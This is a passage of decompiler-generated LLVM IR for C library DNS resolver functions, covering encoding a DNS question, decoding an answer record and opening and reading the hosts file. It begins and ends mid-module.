  uselistorder i32 7, { 22, 23, 5, 9, 6, 0, 4, 10, 17, 18, 19, 20, 21, 7, 3, 1, 16, 8, 11, 12, 13, 14, 15, 2 }
  uselistorder i32 6, { 24, 25, 0, 1, 11, 21, 4, 19, 12, 13, 8, 27, 14, 22, 5, 6, 3, 7, 10, 9, 15, 23, 16, 20, 17, 18, 26, 2 }
  uselistorder i32 28, { 35, 36, 18, 19, 37, 25, 49, 48, 41, 42, 0, 43, 44, 45, 46, 47, 4, 5, 6, 2, 26, 17, 20, 21, 38, 39, 27, 28, 29, 30, 31, 32, 3, 33, 50, 40, 22, 23, 24, 7, 8, 34, 13, 12, 10, 11, 14, 15, 9, 16, 1 }
  uselistorder i8 2, { 1, 2, 3, 4, 5, 16, 6, 0, 22, 19, 7, 8, 9, 10, 11, 12, 20, 21, 13, 17, 18, 14, 15 }
  uselistorder i8 4, { 1, 6, 7, 4, 5, 0, 2, 3 }
  uselistorder i8 16, { 0, 1, 2, 4, 5, 6, 7, 8, 3 }
  uselistorder i8 8, { 0, 8, 1, 7, 2, 3, 4, 5, 6 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_80574ec = load i32, i32* @edi, align 4
  %v0_80574ed = load i32, i32* @esi, align 4
  %v0_80574ee = load i32, i32* @ebx, align 4
  store i32 %v0_80574ee, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_80574fb = load i32, i32* @eax, align 4
  %v1_80574fe = inttoptr i32 %tmp to i32*
  %v2_80574fe = load i32, i32* %v1_80574fe, align 4
  %v7_8057500 = inttoptr i32 %v2_80574fe to i8*
  %v8_8057500 = call i32 @__encode_dotted(i8* %v7_8057500, i32 %tmp2, i32 %tmp3, i32 %v0_80574fb, i32 %v0_80574ee, i32 %v0_80574ed, i32 %v0_80574ec)
  %v2_8057508 = icmp slt i32 %v8_8057500, 0
  store i32 %v8_8057500, i32* @ecx, align 4
  br i1 %v2_8057508, label %dec_label_pc_8057539, label %dec_label_pc_805750e

dec_label_pc_805750e:                             ; preds = %entry
  %v0_805750e = load i32, i32* @ebx, align 4
  %v2_805750e = sub i32 %v0_805750e, %v8_8057500
  %v1_8057510 = add i32 %v2_805750e, -3
  %v6_8057510 = sub i32 2, %v2_805750e
  %v7_8057510 = and i32 %v6_8057510, %v2_805750e
  %v8_8057510 = icmp slt i32 %v7_8057510, 0
  %v9_8057510 = icmp eq i32 %v1_8057510, 0
  %v10_8057510 = icmp slt i32 %v1_8057510, 0
  %v3_8057513 = icmp eq i1 %v10_8057510, %v8_8057510
  %v4_8057513 = icmp eq i1 %v9_8057510, false
  %v5_8057513 = and i1 %v4_8057513, %v3_8057513
  br i1 %v5_8057513, label %dec_label_pc_805751a, label %dec_label_pc_8057515

dec_label_pc_8057515:                             ; preds = %dec_label_pc_805750e
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8057539

dec_label_pc_805751a:                             ; preds = %dec_label_pc_805750e
  %v0_805751a = load i32, i32* @edi, align 4
  %v2_805751a = add i32 %v0_805751a, %v8_8057500
  store i32 %v2_805751a, i32* @edx, align 4
  %v0_805751d = load i32, i32* @esi, align 4
  %v1_805751d = add i32 %v0_805751d, 5
  %v2_805751d = inttoptr i32 %v1_805751d to i8*
  %v3_805751d = load i8, i8* %v2_805751d, align 1
  %v1_8057521 = add i32 %v8_8057500, 4
  store i32 %v1_8057521, i32* @ecx, align 4
  %v3_8057524 = inttoptr i32 %v2_805751a to i8*
  store i8 %v3_805751d, i8* %v3_8057524, align 1
  %v0_8057526 = load i32, i32* @esi, align 4
  %v1_8057526 = add i32 %v0_8057526, 4
  %v2_8057526 = inttoptr i32 %v1_8057526 to i32*
  %v3_8057526 = load i32, i32* %v2_8057526, align 4
  %v1_8057529 = trunc i32 %v3_8057526 to i8
  %v2_8057529 = load i32, i32* @edx, align 4
  %v3_8057529 = add i32 %v2_8057529, 1
  %v4_8057529 = inttoptr i32 %v3_8057529 to i8*
  store i8 %v1_8057529, i8* %v4_8057529, align 1
  %v0_805752c = load i32, i32* @esi, align 4
  %v1_805752c = add i32 %v0_805752c, 9
  %v2_805752c = inttoptr i32 %v1_805752c to i8*
  %v3_805752c = load i8, i8* %v2_805752c, align 1
  %v2_8057530 = load i32, i32* @edx, align 4
  %v3_8057530 = add i32 %v2_8057530, 2
  %v4_8057530 = inttoptr i32 %v3_8057530 to i8*
  store i8 %v3_805752c, i8* %v4_8057530, align 1
  %v0_8057533 = load i32, i32* @esi, align 4
  %v1_8057533 = add i32 %v0_8057533, 8
  %v2_8057533 = inttoptr i32 %v1_8057533 to i32*
  %v3_8057533 = load i32, i32* %v2_8057533, align 4
  %v1_8057536 = trunc i32 %v3_8057533 to i8
  %v2_8057536 = load i32, i32* @edx, align 4
  %v3_8057536 = add i32 %v2_8057536, 3
  %v4_8057536 = inttoptr i32 %v3_8057536 to i8*
  store i8 %v1_8057536, i8* %v4_8057536, align 1
  %v0_805753a.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8057539

dec_label_pc_8057539:                             ; preds = %entry, %dec_label_pc_8057515, %dec_label_pc_805751a
  %v0_805753a = phi i32 [ %v8_8057500, %entry ], [ -1, %dec_label_pc_8057515 ], [ %v0_805753a.pre, %dec_label_pc_805751a ]
  %v2_8057539 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8057539, i32* @ebx, align 4
  store i32 %v0_80574ec, i32* @edi, align 4
  ret i32 %v0_805753a

; uselistorder directives
  uselistorder i32 %v1_8057510, { 1, 0 }
  uselistorder i32 %v2_805750e, { 0, 2, 1 }
  uselistorder i32 %v8_8057500, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 8, 4, 5, 6, 0, 7 }
  uselistorder label %dec_label_pc_8057539, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_805754b = call i32 @__length_dotted(i32 %tmp, i32 %tmp1)
  %v2_8057550 = icmp slt i32 %v2_805754b, 0
  %v1_8057552 = add i32 %v2_805754b, 4
  %v1_8057555 = icmp eq i1 %v2_8057550, false
  %v4_8057555 = select i1 %v1_8057555, i32 %v1_8057552, i32 %v2_805754b
  ret i32 %v4_8057555

; uselistorder directives
  uselistorder i32 %v2_805754b, { 1, 0, 2 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805755c = load i32, i32* @ebp, align 4
  %v0_805755d = load i32, i32* @edi, align 4
  %v0_805755e = load i32, i32* @esi, align 4
  %v0_805755f = load i32, i32* @ebx, align 4
  store i32 %v0_805755f, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8057580 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8057580, i32* %eax.global-to-local, align 4
  %v4_805758d = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_8057580, i32 256)
  store i32 %v4_805758d, i32* %eax.global-to-local, align 4
  %v3_8057595 = icmp slt i32 %v4_805758d, 0
  store i32 %v4_805758d, i32* @edi, align 4
  br i1 %v3_8057595, label %dec_label_pc_8057648, label %dec_label_pc_805759f

dec_label_pc_805759f:                             ; preds = %entry
  %v0_805759f = load i32, i32* @ebx, align 4
  %v3_805759f = add i32 %v0_805759f, %v4_805758d
  %v0_80575a1 = load i32, i32* @esi, align 4
  %v2_80575a1 = sub i32 %v0_80575a1, %v3_805759f
  %v1_80575a3 = add i32 %v2_80575a1, -10
  %v10_80575a3 = icmp slt i32 %v1_80575a3, 0
  store i32 %v1_80575a3, i32* @esi, align 4
  %v1_80575ae = icmp eq i1 %v10_80575a3, false
  br i1 %v1_80575ae, label %dec_label_pc_80575b7, label %dec_label_pc_80575b0

dec_label_pc_80575b0:                             ; preds = %dec_label_pc_805759f
  br label %dec_label_pc_8057648

dec_label_pc_80575b7:                             ; preds = %dec_label_pc_805759f
  %v6_80575be = add i32 %v3_805759f, %tmp4
  store i32 %v6_80575be, i32* @ebx, align 4
  store i32 %v2_8057580, i32* %eax.global-to-local, align 4
  %v1_80575ca = bitcast i32* %stack_var_-272 to i8*
  %v2_80575ca = call i32 @__GI_strdup(i8* %v1_80575ca)
  store i32 %v2_80575ca, i32* %eax.global-to-local, align 4
  %v0_80575cf = load i32, i32* @ebx, align 4
  %v1_80575cf = add i32 %v0_80575cf, 4
  store i32 %v1_80575cf, i32* %esi.global-to-local, align 4
  %v1_80575d2 = load i32, i32* @ebp, align 4
  %v2_80575d2 = inttoptr i32 %v1_80575d2 to i32*
  store i32 %v2_80575ca, i32* %v2_80575d2, align 4
  %v0_80575d5 = load i32, i32* @ebx, align 4
  %v1_80575d5 = inttoptr i32 %v0_80575d5 to i8*
  %v2_80575d5 = load i8, i8* %v1_80575d5, align 1
  %v3_80575d5 = zext i8 %v2_80575d5 to i32
  store i32 %v3_80575d5, i32* %eax.global-to-local, align 4
  %v1_80575d8 = add i32 %v0_80575d5, 1
  %v2_80575d8 = inttoptr i32 %v1_80575d8 to i8*
  %v3_80575d8 = load i8, i8* %v2_80575d8, align 1
  %v4_80575d8 = zext i8 %v3_80575d8 to i32
  store i32 %v4_80575d8, i32* %edx.global-to-local, align 4
  %v2_80575dc = mul nuw nsw i32 %v3_80575d5, 256
  %v2_80575df = or i32 %v4_80575d8, %v2_80575dc
  store i32 %v2_80575df, i32* %eax.global-to-local, align 4
  %v1_80575e1 = load i32, i32* @ebp, align 4
  %v2_80575e1 = add i32 %v1_80575e1, 4
  %v3_80575e1 = inttoptr i32 %v2_80575e1 to i32*
  store i32 %v2_80575df, i32* %v3_80575e1, align 4
  %v0_80575e4 = load i32, i32* @ebx, align 4
  %v1_80575e4 = add i32 %v0_80575e4, 2
  %v2_80575e4 = inttoptr i32 %v1_80575e4 to i8*
  %v3_80575e4 = load i8, i8* %v2_80575e4, align 1
  %v4_80575e4 = zext i8 %v3_80575e4 to i32
  store i32 %v4_80575e4, i32* %eax.global-to-local, align 4
  %v1_80575e8 = add i32 %v0_80575e4, 3
  %v2_80575e8 = inttoptr i32 %v1_80575e8 to i8*
  %v3_80575e8 = load i8, i8* %v2_80575e8, align 1
  %v4_80575e8 = zext i8 %v3_80575e8 to i32
  store i32 %v4_80575e8, i32* %edx.global-to-local, align 4
  %v2_80575ec = mul nuw nsw i32 %v4_80575e4, 256
  %v2_80575ef = or i32 %v4_80575e8, %v2_80575ec
  store i32 %v2_80575ef, i32* %eax.global-to-local, align 4
  %v1_80575f1 = load i32, i32* @ebp, align 4
  %v2_80575f1 = add i32 %v1_80575f1, 8
  %v3_80575f1 = inttoptr i32 %v2_80575f1 to i32*
  store i32 %v2_80575ef, i32* %v3_80575f1, align 4
  %v0_80575f4 = load i32, i32* @ebx, align 4
  %v1_80575f4 = add i32 %v0_80575f4, 4
  %v2_80575f4 = inttoptr i32 %v1_80575f4 to i8*
  %v3_80575f4 = load i8, i8* %v2_80575f4, align 1
  %v4_80575f4 = zext i8 %v3_80575f4 to i32
  store i32 %v4_80575f4, i32* %edx.global-to-local, align 4
  %v0_80575f8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80575f8 = add i32 %v0_80575f8, 1
  %v2_80575f8 = inttoptr i32 %v1_80575f8 to i8*
  %v3_80575f8 = load i8, i8* %v2_80575f8, align 1
  %v4_80575f8 = zext i8 %v3_80575f8 to i32
  store i32 %v4_80575f8, i32* %eax.global-to-local, align 4
  %v1_80575fc = add i32 %v0_80575f8, 2
  %v2_80575fc = inttoptr i32 %v1_80575fc to i8*
  %v3_80575fc = load i8, i8* %v2_80575fc, align 1
  %v4_80575fc = zext i8 %v3_80575fc to i32
  %v2_8057600 = mul nuw i32 %v4_80575f4, 16777216
  %v2_8057603 = mul nuw nsw i32 %v4_80575f8, 65536
  store i32 %v2_8057603, i32* %eax.global-to-local, align 4
  %v2_8057606 = or i32 %v2_8057603, %v2_8057600
  store i32 %v2_8057606, i32* %edx.global-to-local, align 4
  %v1_8057608 = add i32 %v0_80575f8, 3
  %v2_8057608 = inttoptr i32 %v1_8057608 to i8*
  %v3_8057608 = load i8, i8* %v2_8057608, align 1
  %v4_8057608 = zext i8 %v3_8057608 to i32
  store i32 %v4_8057608, i32* %eax.global-to-local, align 4
  %v2_805760c = mul nuw nsw i32 %v4_80575fc, 256
  %v2_805760f = or i32 %v4_8057608, %v2_8057606
  store i32 %v2_805760f, i32* %edx.global-to-local, align 4
  %v2_8057611 = or i32 %v2_805760f, %v2_805760c
  store i32 %v2_8057611, i32* @ecx, align 4
  %v1_8057613 = load i32, i32* @ebp, align 4
  %v2_8057613 = add i32 %v1_8057613, 12
  %v3_8057613 = inttoptr i32 %v2_8057613 to i32*
  store i32 %v2_8057611, i32* %v3_8057613, align 4
  %v0_8057616 = load i32, i32* @ebx, align 4
  %v1_8057616 = add i32 %v0_8057616, 8
  %v2_8057616 = inttoptr i32 %v1_8057616 to i8*
  %v3_8057616 = load i8, i8* %v2_8057616, align 1
  %v4_8057616 = zext i8 %v3_8057616 to i32
  store i32 %v4_8057616, i32* %edx.global-to-local, align 4
  %v1_805761a = add i32 %v0_8057616, 9
  %v2_805761a = inttoptr i32 %v1_805761a to i8*
  %v3_805761a = load i8, i8* %v2_805761a, align 1
  %v4_805761a = zext i8 %v3_805761a to i32
  store i32 %v4_805761a, i32* %eax.global-to-local, align 4
  %v1_805761e = add i32 %v0_8057616, 10
  %v1_8057621 = load i32, i32* @ebp, align 4
  %v2_8057621 = add i32 %v1_8057621, 20
  %v3_8057621 = inttoptr i32 %v2_8057621 to i32*
  store i32 %v1_805761e, i32* %v3_8057621, align 4
  %v0_8057624 = load i32, i32* %edx.global-to-local, align 4
  %v2_8057624 = mul i32 %v0_8057624, 256
  %v1_8057627 = load i32, i32* %eax.global-to-local, align 4
  %v2_8057627 = or i32 %v1_8057627, %v2_8057624
  store i32 %v2_8057627, i32* @edx, align 4
  %v1_8057629 = load i32, i32* @ebp, align 4
  %v2_8057629 = add i32 %v1_8057629, 16
  %v3_8057629 = inttoptr i32 %v2_8057629 to i32*
  store i32 %v2_8057627, i32* %v3_8057629, align 4
  %v1_8057633 = add i32 %v3_805759f, 10
  store i32 %v1_8057633, i32* %eax.global-to-local, align 4
  %v1_8057636 = load i32, i32* @ebp, align 4
  %v2_8057636 = add i32 %v1_8057636, 24
  %v3_8057636 = inttoptr i32 %v2_8057636 to i32*
  store i32 %v1_8057633, i32* %v3_8057636, align 4
  %v4_8057639 = load i32, i32* @edx, align 4
  %v5_805763d = icmp slt i32 %v1_80575a3, %v4_8057639
  br i1 %v5_805763d, label %dec_label_pc_805763f, label %dec_label_pc_8057644

dec_label_pc_805763f:                             ; preds = %dec_label_pc_80575b7
  br label %dec_label_pc_8057648

dec_label_pc_8057644:                             ; preds = %dec_label_pc_80575b7
  %v1_8057644 = load i32, i32* @edi, align 4
  %v2_8057644 = add i32 %v4_8057639, 10
  %v3_8057644 = add i32 %v2_8057644, %v1_8057644
  br label %dec_label_pc_8057648

dec_label_pc_8057648:                             ; preds = %entry, %dec_label_pc_805763f, %dec_label_pc_80575b0, %dec_label_pc_8057644
  %v0_805764e = phi i32 [ %v4_805758d, %entry ], [ -1, %dec_label_pc_805763f ], [ %v1_80575a3, %dec_label_pc_80575b0 ], [ %v3_8057644, %dec_label_pc_8057644 ]
  store i32 %v0_805764e, i32* %eax.global-to-local, align 4
  %v2_8057650 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8057650, i32* @ebx, align 4
  store i32 %v0_805755e, i32* @esi, align 4
  store i32 %v0_805755d, i32* @edi, align 4
  store i32 %v0_805755c, i32* @ebp, align 4
  ret i32 %v0_805764e

; uselistorder directives
  uselistorder i32 %v0_805764e, { 1, 0 }
  uselistorder i32 %v2_8057603, { 1, 0 }
  uselistorder i32 %v1_80575a3, { 0, 1, 3, 2 }
  uselistorder i32 %v3_805759f, { 1, 0, 2 }
  uselistorder i32 %v4_805758d, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_8057580, { 1, 0, 2 }
  uselistorder i32 24, { 31, 32, 20, 0, 33, 34, 35, 21, 5, 10, 38, 11, 12, 13, 36, 22, 23, 24, 25, 26, 27, 28, 40, 2, 37, 14, 15, 16, 17, 18, 19, 3, 29, 4, 6, 7, 8, 9, 30, 1, 39 }
  uselistorder i32 20, { 33, 34, 35, 36, 2, 17, 40, 5, 41, 37, 38, 3, 18, 19, 1, 7, 8, 32, 9, 10, 11, 20, 21, 22, 23, 24, 6, 25, 26, 43, 39, 4, 12, 13, 14, 15, 16, 27, 28, 29, 30, 31, 42, 0 }
  uselistorder i32 9, { 19, 20, 21, 22, 7, 23, 13, 14, 5, 12, 0, 8, 15, 16, 17, 18, 9, 10, 11, 6, 3, 2, 24, 1, 25, 4 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 7, 9, 8, 11, 10 }
  uselistorder i32 3, { 55, 56, 57, 58, 59, 60, 22, 0, 13, 1, 23, 2, 18, 54, 3, 61, 24, 5, 4, 6, 11, 12, 10, 25, 14, 26, 47, 21, 48, 31, 32, 33, 34, 35, 36, 62, 19, 20, 37, 27, 16, 17, 7, 38, 29, 53, 28, 39, 9, 40, 41, 42, 43, 49, 50, 51, 52, 8, 30, 44, 45, 46, 15 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8057648, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_8057665 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_805afc5.567 to i32), i32 ptrtoint (i32* @global_var_805af90.555 to i32))
  store i32 %v3_8057665, i32* @eax, align 4
  %v1_805766d = icmp eq i32 %v3_8057665, 0
  %v1_805766f = icmp eq i1 %v1_805766d, false
  br i1 %v1_805766f, label %dec_label_pc_8057685, label %dec_label_pc_8057671

dec_label_pc_8057671:                             ; preds = %entry
  %v3_805767d = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_805afd0.568 to i32), i32 ptrtoint (i32* @global_var_805af90.555 to i32))
  br label %dec_label_pc_8057685

dec_label_pc_8057685:                             ; preds = %entry, %dec_label_pc_8057671
  %v0_8057688 = phi i32 [ %v3_8057665, %entry ], [ %v3_805767d, %dec_label_pc_8057671 ]
  ret i32 %v0_8057688

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0, 6, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_805af90.555 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_8057685, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8057689 = load i32, i32* @ebp, align 4
  %v0_805768a = load i32, i32* @edi, align 4
  %v0_805768b = load i32, i32* @esi, align 4
  %v0_805768c = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_805769a = sub i32 0, %arg6
  %v1_805769c = urem i32 %v1_805769a, 4
  %v2_805769c = icmp eq i32 %v1_805769c, 0
  store i32 %v1_805769c, i32* %eax.global-to-local, align 4
  br i1 %v2_805769c, label %dec_label_pc_80576ad, label %dec_label_pc_80576a1

dec_label_pc_80576a1:                             ; preds = %entry
  %v2_80576a1 = sub i32 %arg7, %v1_805769c
  %v7_80576a1 = icmp ugt i32 %v1_805769c, %arg7
  br i1 %v7_80576a1, label %dec_label_pc_8057951, label %dec_label_pc_80576a9

dec_label_pc_80576a9:                             ; preds = %dec_label_pc_80576a1
  %v2_80576a9 = add i32 %v1_805769c, %arg6
  store i32 %v2_80576a9, i32* @ebx, align 4
  store i32 %v2_80576a1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80576ad

dec_label_pc_80576ad:                             ; preds = %entry, %dec_label_pc_80576a9
  %v0_80576bb = phi i32 [ %arg6, %entry ], [ %v2_80576a9, %dec_label_pc_80576a9 ]
  %v0_80576c2 = phi i32 [ %arg7, %entry ], [ %v2_80576a1, %dec_label_pc_80576a9 ]
  %tmp = icmp ult i32 %v0_80576c2, 32
  br i1 %tmp, label %dec_label_pc_8057951, label %dec_label_pc_80576b6

dec_label_pc_80576b6:                             ; preds = %dec_label_pc_80576ad
  %v12_80576b6 = icmp eq i32 %arg4, 1
  %v1_80576bb = add i32 %v0_80576bb, 32
  store i32 %v1_80576bb, i32* %eax.global-to-local, align 4
  %v1_80576c2 = add i32 %v0_80576c2, -32
  store i32 %v1_80576c2, i32* @ebp, align 4
  br i1 %v12_80576b6, label %dec_label_pc_80576b6.dec_label_pc_8057801_crit_edge, label %dec_label_pc_80576cb

dec_label_pc_80576b6.dec_label_pc_8057801_crit_edge: ; preds = %dec_label_pc_80576b6
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8057801

dec_label_pc_80576cb:                             ; preds = %dec_label_pc_80576b6
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_80576d2 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_80576d2, align 4
  %tmp144 = icmp ult i32 %v1_80576c2, 4
  br i1 %tmp144, label %dec_label_pc_8057951, label %dec_label_pc_80576de

dec_label_pc_80576de:                             ; preds = %dec_label_pc_80576cb
  %v0_80576de = load i32, i32* %edx.global-to-local, align 4
  %v1_80576de = add i32 %v0_80576de, -36
  store i32 %v1_80576de, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ult i32 %v1_80576de, 8
  br i1 %tmp145, label %dec_label_pc_8057951, label %dec_label_pc_80576ea

dec_label_pc_80576ea:                             ; preds = %dec_label_pc_80576de
  %v0_80576ea = load i32, i32* @ebp, align 4
  %tmp146 = icmp ult i32 %v0_80576ea, 16
  br i1 %tmp146, label %dec_label_pc_8057951, label %dec_label_pc_80576f3

dec_label_pc_80576f3:                             ; preds = %dec_label_pc_80576ea
  %v1_80576f3 = add i32 %v0_80576de, -48
  store i32 %v1_80576f3, i32* %eax.global-to-local, align 4
  %tmp147 = icmp ult i32 %v1_80576f3, 8
  br i1 %tmp147, label %dec_label_pc_8057951, label %dec_label_pc_80576ff

dec_label_pc_80576ff:                             ; preds = %dec_label_pc_80576f3
  %v0_80576ff = load i32, i32* @ebx, align 4
  %v1_80576ff = add i32 %v0_80576ff, 48
  %v1_8057702 = add i32 %v0_80576de, -44
  store i32 %v1_8057702, i32* @ebp, align 4
  %v1_8057709 = add i32 %v0_80576de, -56
  store i32 %v1_8057709, i32* @eax, align 4
  %v7_805770c = icmp ult i32 %v1_8057709, %v1_8057702
  %v1_805770e = add i32 %v0_80576ff, 36
  store i32 %v1_805770e, i32* @edi, align 4
  br i1 %v7_805770c, label %dec_label_pc_8057718, label %dec_label_pc_8057713

dec_label_pc_8057713:                             ; preds = %dec_label_pc_80576ff
  %v1_8057713 = add i32 %v0_80576ff, 44
  store i32 %v1_8057713, i32* @esi, align 4
  br label %dec_label_pc_805771d

dec_label_pc_8057718:                             ; preds = %dec_label_pc_80576ff
  %v1_8057718 = add i32 %v0_80576ff, 56
  store i32 %v1_8057718, i32* @esi, align 4
  store i32 %v1_8057709, i32* @ebp, align 4
  br label %dec_label_pc_805771d

dec_label_pc_805771d:                             ; preds = %dec_label_pc_8057713, %dec_label_pc_8057718
  %v0_805771d = phi i32 [ %v1_8057702, %dec_label_pc_8057713 ], [ %v1_8057709, %dec_label_pc_8057718 ]
  %tmp148 = icmp ult i32 %v0_805771d, 80
  br i1 %tmp148, label %dec_label_pc_8057951, label %dec_label_pc_8057726

dec_label_pc_8057726:                             ; preds = %dec_label_pc_805771d
  %v0_8057726 = call i32 @__open_etc_hosts()
  store i32 %v0_8057726, i32* %eax.global-to-local, align 4
  %v1_805772b = icmp eq i32 %v0_8057726, 0
  br i1 %v1_805772b, label %dec_label_pc_8057753, label %dec_label_pc_8057733

dec_label_pc_8057733:                             ; preds = %dec_label_pc_8057726
  store i32 %v1_80576bb, i32* %edx.global-to-local, align 4
  store i32 %v1_80576ff, i32* %eax.global-to-local, align 4
  %v0_805773b = load i32, i32* @edi, align 4
  %v0_805773f = load i32, i32* @esi, align 4
  %v4_8057743 = inttoptr i32 %v1_80576bb to i8*
  br label %dec_label_pc_8057801

dec_label_pc_8057753:                             ; preds = %dec_label_pc_8057726
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8057757 = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8057757, align 4
  %v1_805775d = call i32 @__errno_location(i32 0)
  store i32 %v1_805775d, i32* %eax.global-to-local, align 4
  %v1_8057762 = inttoptr i32 %v1_805775d to i32*
  %v2_8057762 = load i32, i32* %v1_8057762, align 4
  store i32 %v2_8057762, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057951

dec_label_pc_805776d:                             ; preds = %dec_label_pc_80578d4
  %v2_805776d = load i8*, i8** %stack_var_-44, align 4
  %v3_805776d = ptrtoint i8* %v2_805776d to i32
  store i32 %v3_805776d, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8057774 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_805776d, i32* %v2_8057774, align 4
  %v0_8057776 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057776 = add i32 %v0_8057776, 4
  %v2_8057776 = inttoptr i32 %v1_8057776 to i32*
  store i32 0, i32* %v2_8057776, align 4
  %v0_805777d = load i32, i32* @ebx, align 4
  %v1_805777d = add i32 %v0_805777d, 4
  %v2_805777d = inttoptr i32 %v1_805777d to i32*
  %v3_805777d = load i32, i32* %v2_805777d, align 4
  store i32 %v3_805777d, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_805777d, i32* %arg5, align 4
  %v1_8057786 = add i32 %tmp60, 8
  %v2_8057786 = inttoptr i32 %v1_8057786 to i32*
  store i32 2, i32* %v2_8057786, align 4
  %v0_805778d = load i32, i32* %edx.global-to-local, align 4
  %v1_805778d = add i32 %v0_805778d, 12
  %v2_805778d = inttoptr i32 %v1_805778d to i32*
  store i32 4, i32* %v2_805778d, align 4
  br label %dec_label_pc_80577c6

dec_label_pc_805779a:                             ; preds = %dec_label_pc_80578f6
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_80577a2 = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_80577a2, align 4
  %v0_80577a4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80577a4 = add i32 %v0_80577a4, 4
  %v2_80577a4 = inttoptr i32 %v1_80577a4 to i32*
  store i32 0, i32* %v2_80577a4, align 4
  %v0_80577ab = load i32, i32* @ebx, align 4
  %v1_80577ab = add i32 %v0_80577ab, 4
  %v2_80577ab = inttoptr i32 %v1_80577ab to i32*
  %v3_80577ab = load i32, i32* %v2_80577ab, align 4
  store i32 %v3_80577ab, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_80577ab, i32* %arg5, align 4
  %v1_80577b4 = add i32 %tmp60, 8
  %v2_80577b4 = inttoptr i32 %v1_80577b4 to i32*
  store i32 10, i32* %v2_80577b4, align 4
  %v0_80577bb = load i32, i32* %edx.global-to-local, align 4
  %v1_80577bb = add i32 %v0_80577bb, 12
  %v2_80577bb = inttoptr i32 %v1_80577bb to i32*
  store i32 16, i32* %v2_80577bb, align 4
  br label %dec_label_pc_80577c6

dec_label_pc_80577c6:                             ; preds = %dec_label_pc_805776d, %dec_label_pc_805779a
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_805776d ], [ %storemerge3, %dec_label_pc_805779a ]
  %v1_80577c6 = load i32, i32* %edx.global-to-local, align 4
  %v2_80577c6 = add i32 %v1_80577c6, 16
  %v3_80577c6 = inttoptr i32 %v2_80577c6 to i32*
  store i32 %storemerge, i32* %v3_80577c6, align 4
  %v0_80577c9 = load i32, i32* @ebx, align 4
  %v1_80577c9 = add i32 %v0_80577c9, 8
  %v1_80577cc = load i32, i32* %edx.global-to-local, align 4
  %v2_80577cc = add i32 %v1_80577cc, 4
  %v3_80577cc = inttoptr i32 %v2_80577cc to i32*
  store i32 %v1_80577c9, i32* %v3_80577cc, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_80577d3 = load i32, i32* %edx.global-to-local, align 4
  %v2_80577d3 = inttoptr i32 %arg8 to i32*
  store i32 %v0_80577d3, i32* %v2_80577d3, align 4
  br label %dec_label_pc_8057931

dec_label_pc_8057801:                             ; preds = %dec_label_pc_80576b6.dec_label_pc_8057801_crit_edge, %dec_label_pc_8057733
